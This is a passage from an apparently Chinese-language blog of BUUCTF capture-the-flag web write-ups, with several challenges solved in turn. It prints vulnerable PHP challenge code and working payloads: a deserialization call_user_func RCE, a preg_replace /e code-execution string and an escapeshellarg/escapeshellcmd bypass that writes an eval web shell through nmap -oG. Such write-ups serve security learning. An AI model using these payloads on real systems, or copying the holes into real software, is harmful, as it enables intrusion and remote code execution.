class="p">,</span><span class="s2">&#34;array_walk&#34;</span><span class="p">,</span> <span class="s2">&#34;array_walk_recursive&#34;</span><span class="p">,</span><span class="s2">&#34;pcntl_exec&#34;</span><span class="p">,</span><span class="s2">&#34;fopen&#34;</span><span class="p">,</span><span class="s2">&#34;fwrite&#34;</span><span class="p">,</span><span class="s2">&#34;file_put_contents&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">gettime</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$p</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$result</span> <span class="o">=</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$p</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$a</span><span class="o">=</span> <span class="nx">gettype</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">==</span> <span class="s2">&#34;string&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="p">;}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Test</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">var</span> <span class="nv">$p</span> <span class="o">=</span> <span class="s2">&#34;Y-m-d h:i:s a&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">var</span> <span class="nv">$func</span> <span class="o">=</span> <span class="s2">&#34;date&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">func</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="nx">gettime</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">func</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$func</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;func&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$p</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;p&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$func</span> <span class="o">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$func</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$func</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nv">$disable_fun</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nx">gettime</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$p</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Hacker...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">var</span> <span class="nv">$p</span> <span class="o">=</span> <span class="s2">&#34;Y-m-d h:i:s a&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">var</span> <span class="nv">$func</span> <span class="o">=</span> <span class="s2">&#34;date&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">func</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="nx">gettime</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">func</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–ï¼Œæ¥rceï¼Œå› ä¸ºgettimeå‡½æ•°æœ¬è´¨æ˜¯call_user_funcå‡½æ•°ï¼Œå¯ä»¥rce</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">var</span> <span class="nv">$p</span> <span class="o">=</span> <span class="s2">&#34;ls&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">var</span> <span class="nv">$func</span> <span class="o">=</span> <span class="s2">&#34;system&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åå‰é¢funcä¼ unserializeå‡½æ•°</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209140545313.png"
	width="1825"
	height="641"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209140545313_hu4300750241893974428.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209140545313_hu7532352048684961123.png 1024w"
	loading="lazy"
	
		alt="image-20250209140545313"
	
	
		class="gallery-image" 
		data-flex-grow="284"
		data-flex-basis="683px"
	
></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209140753435.png"
	width="1766"
	height="686"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209140753435_hu4100999084569372689.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209140753435_hu6042760318160422444.png 1024w"
	loading="lazy"
	
		alt="image-20250209140753435"
	
	
		class="gallery-image" 
		data-flex-grow="257"
		data-flex-basis="617px"
	
></p>
<p>éƒ½æ²¡æœ‰æˆ‘ä»¬ç›´æ¥findæŸ¥æ‰¾</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209140845510.png"
	width="1850"
	height="684"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209140845510_hu165542964673131747.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209140845510_hu16506465532507393306.png 1024w"
	loading="lazy"
	
		alt="image-20250209140845510"
	
	
		class="gallery-image" 
		data-flex-grow="270"
		data-flex-basis="649px"
	
></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209140929226.png"
	width="1860"
	height="710"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209140929226_hu1702676326642623232.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209140929226_hu14361113559852143113.png 1024w"
	loading="lazy"
	
		alt="image-20250209140929226"
	
	
		class="gallery-image" 
		data-flex-grow="261"
		data-flex-basis="628px"
	
></p>
<p>æˆ–è€…</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">func=readfile&amp;p=/tmp/flagoefiu4r93
</span></span><span class="line"><span class="cl">func=unserialize&amp;p=O:4:&#34;Test&#34;:2:{s:1:&#34;p&#34;;s:25:&#34;cat $(find / -name flag*)&#34;;s:4:&#34;func&#34;;s:6:&#34;system&#34;;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œå¥½åƒè¿˜æœ‰éé¢„æœŸ</p>
<p>\å·åé¢çš„å‘½ä»¤ä¸ä¼šè¢«è¯†åˆ«</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">func=\system&amp;p=find / -name flag*
</span></span><span class="line"><span class="cl">func=\system&amp;p=cat /tmp/flagoefiu4r93
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="bjdctf2020the-mystery-of-ip">[BJDCTF2020]The mystery of ip
</h2><p>smartyæ³¨å…¥</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209141534897.png"
	width="1874"
	height="723"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209141534897_hu4731107344489191908.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209141534897_hu17280963412725723899.png 1024w"
	loading="lazy"
	
		alt="image-20250209141534897"
	
	
		class="gallery-image" 
		data-flex-grow="259"
		data-flex-basis="622px"
	
></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209141639426.png"
	width="1866"
	height="783"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209141639426_hu3441093512976670731.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209141639426_hu713522798428886108.png 1024w"
	loading="lazy"
	
		alt="image-20250209141639426"
	
	
		class="gallery-image" 
		data-flex-grow="238"
		data-flex-basis="571px"
	
></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209141659875.png"
	width="1879"
	height="765"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209141659875_hu14010037904397498542.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209141659875_hu13745862924186542974.png 1024w"
	loading="lazy"
	
		alt="image-20250209141659875"
	
	
		class="gallery-image" 
		data-flex-grow="245"
		data-flex-basis="589px"
	
></p>
<h2 id="bjdctf2020zjctfä¸è¿‡å¦‚æ­¤">[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤
</h2><p>è¯»å–next.phpå†…å®¹</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209150818565.png"
	width="1839"
	height="637"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209150818565_hu15548471714424086413.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209150818565_hu12320866817449997658.png 1024w"
	loading="lazy"
	
		alt="image-20250209150818565"
	
	
		class="gallery-image" 
		data-flex-grow="288"
		data-flex-basis="692px"
	
></p>
<p>ä¸‹é¢postä¼ i have a dream</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">complex</span><span class="p">(</span><span class="nv">$re</span><span class="p">,</span> <span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;/(&#39;</span> <span class="o">.</span> <span class="nv">$re</span> <span class="o">.</span> <span class="s1">&#39;)/ei&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;strtolower(&#34;\\1&#34;)&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$str</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$re</span> <span class="o">=&gt;</span> <span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">complex</span><span class="p">(</span><span class="nv">$re</span><span class="p">,</span> <span class="nv">$str</span><span class="p">)</span><span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">getFlag</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">	<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œå‘ç°preg_replaceç”¨äº†/eå‚æ•°ï¼Œæ˜¯å­˜åœ¨rceæ¼æ´çš„</p>
<p>ä½†æ˜¯è¿™é‡Œçš„ç¬¬äºŒä¸ªå‚æ•°å›ºå®šäº†ï¼Œæ¥ä¸‹æ¥å¼•ç”¨è¿™ç¯‡ï¼š<a class="link" href="https://xz.aliyun.com/news/2239"  target="_blank" rel="noopener"
    >æ–‡ç«  - æ·±å…¥ç ”ç©¶preg_replaceä¸ä»£ç æ‰§è¡Œ - å…ˆçŸ¥ç¤¾åŒº</a></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209154052460.png"
	width="1006"
	height="139"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209154052460_hu18435738445340422217.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209154052460_hu1497090911151400531.png 1024w"
	loading="lazy"
	
		alt="image-20250209154052460"
	
	
		class="gallery-image" 
		data-flex-grow="723"
		data-flex-basis="1736px"
	
></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209154107040.png"
	width="964"
	height="93"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209154107040_hu1398163190922067408.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209154107040_hu1317513239394227358.png 1024w"
	loading="lazy"
	
		alt="image-20250209154107040"
	
	
		class="gallery-image" 
		data-flex-grow="1036"
		data-flex-basis="2487px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">åå‘å¼•ç”¨
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å· å°†å¯¼è‡´ç›¸å…³ åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒº ä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ &#39;\n&#39; è®¿é—®ï¼Œå…¶ä¸­ n ä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰€ä»¥è¿™é‡Œçš„ <strong>\1</strong> å®é™…ä¸ŠæŒ‡å®šçš„æ˜¯ç¬¬ä¸€ä¸ªå­åŒ¹é…é¡¹ï¼Œç„¶ååŸæ¥ç¬¬ä¸‰ä¸ªå‚æ•°è¾“å…¥å‘½ä»¤ï¼Œå°±ä¼šå˜æˆç¬¬äºŒä¸ªï¼ŒåŸæ¥çš„ç¬¬ä¸€ä¸ªå‚æ•°å†™å…¥æ¨¡ç³ŠåŒ¹é….*å°±ä¼šåŒ¹é…ç°åœ¨çš„ç¬¬ä¸€ä¸ªå‚æ•°\1ï¼Œç„¶åå°±ä¼šè§¦å‘/eå‚æ•°æ¼æ´</p>
<p>ä½†æ˜¯<code>.*</code>åœ¨phpé‡Œé¢ï¼Œå¯¹äºä¼ å…¥çš„éæ³•çš„ $_GET æ•°ç»„å‚æ•°åï¼Œä¼šå°†å…¶è½¬æ¢æˆä¸‹åˆ’çº¿ï¼Œæˆ‘ä»¬æ”¹ä¸º<code>S*</code></p>
<p>æœ€ç»ˆpayload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\S*=${getFlag()}&amp;cmd=system(&#39;ls /&#39;)
</span></span><span class="line"><span class="cl">\S*=${getFlag()}&amp;cmd=system(&#39;cat /flag&#39;)
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œç”¨${}åŒ…è£¹å‡½æ•°ï¼Œæ˜¯phpå¯å˜å˜é‡çš„åŸå› ï¼š<a class="link" href="https://www.php.net/manual/zh/language.variables.variable.php"  target="_blank" rel="noopener"
    >PHP: å¯å˜å˜é‡ - Manual</a></p>
<p>åœ¨PHPä¸­åŒå¼•å·åŒ…è£¹çš„å­—ç¬¦ä¸²ä¸­å¯ä»¥è§£æå˜é‡ï¼Œè€Œå•å¼•å·åˆ™ä¸è¡Œã€‚ <strong>${phpinfo()}</strong> ä¸­çš„ <strong>phpinfo()</strong> ä¼šè¢«å½“åšå˜é‡å…ˆæ‰§è¡Œï¼Œæ‰§è¡Œåï¼Œå³å˜æˆ <strong>${1}</strong> (phpinfo()æˆåŠŸæ‰§è¡Œè¿”å›true)</p>
<h2 id="buuctf-2018online-tool">[BUUCTF 2018]Online Tool
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$host</span> <span class="o">=</span> <span class="nx">escapeshellarg</span><span class="p">(</span><span class="nv">$host</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$host</span> <span class="o">=</span> <span class="nx">escapeshellcmd</span><span class="p">(</span><span class="nv">$host</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sandbox</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="s2">&#34;glzjin&#34;</span><span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;you are in sandbox &#39;</span><span class="o">.</span><span class="nv">$sandbox</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;nmap -T5 -sT -Pn --host-timeout 2 -F &#34;</span><span class="o">.</span><span class="nv">$host</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œescapeshellargå’Œescapeshellcmdå‡½æ•°æŒ‰è¿™æ ·é¡ºåºè°ƒç”¨æœ‰ä¸ªæ¼æ´</p>
<p>å‚è€ƒï¼š<a class="link" href="https://paper.seebug.org/164/"  target="_blank" rel="noopener"
    >PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š172.17.0.2&#39; -v -d a=1
</span></span><span class="line"><span class="cl">ç»è¿‡escapeshellargå¤„ç†åå˜æˆäº†&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚
</span></span><span class="line"><span class="cl">ç»è¿‡escapeshellcmdå¤„ç†åå˜æˆ&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;ï¼Œè¿™æ˜¯å› ä¸ºescapeshellcmdå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼šhttp://php.net/manual/zh/function.escapeshellcmd.php
</span></span><span class="line"><span class="cl">æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;ï¼Œç”±äºä¸­é—´çš„\\è¢«è§£é‡Šä¸º\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„&#39;æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„&#39;é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl 172.17.0.2\ -v -d a=1&#39;ï¼Œå³å‘172.17.0.2\å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸ºa=1&#39;ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åæˆ‘ä»¬åªè¦æŠŠæƒ³è¦æ‰§è¡Œçš„è¯­å¥ç”¨å•å¼•å·æ‹¬èµ·æ¥åŠ ç©ºæ ¼å°±èƒ½ç»•è¿‡</p>
<p>è¿™é‡Œæœ€åç”¨nmapå‘½ä»¤ï¼Œnmapæœ‰ä¸€ä¸ªå‚æ•°-oGå¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?host=&#39; &lt;?php @eval($_POST[&#34;cmd&#34;]);?&gt; -oG shell.php &#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åèšå‰‘è¿æ¥</p>
<p>è¿™é‡Œè§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆåŠ å¼•å·å’Œç©ºæ ¼</p>
<p>å¦‚æœåé¢æ²¡æœ‰åŠ å¼•å·ï¼Œåœ¨ä¼ æ–‡ä»¶ä¹‹åï¼Œæ–‡ä»¶ååä¼šå¤šä¸€ä¸ªå¼•å·</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
